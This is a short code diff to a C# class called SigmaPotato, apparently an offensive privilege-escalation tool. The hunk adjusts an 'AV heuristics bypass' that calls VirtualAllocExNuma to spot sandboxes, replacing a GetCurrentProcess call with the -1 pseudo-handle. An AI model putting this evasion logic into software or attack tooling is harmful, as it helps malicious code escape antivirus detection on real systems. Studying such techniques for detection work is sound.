@@ -16,10 +16,8 @@ public class SigmaPotato
         // Rudimentary AV Heuristics Bypass by calling an Uncommon API
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocExNuma(IntPtr hprocess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreffered);
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetCurrentProcess();
 
-        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+        IntPtr mem = VirtualAllocExNuma((IntPtr)(-1), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
         if (mem == null)
         {
             return;
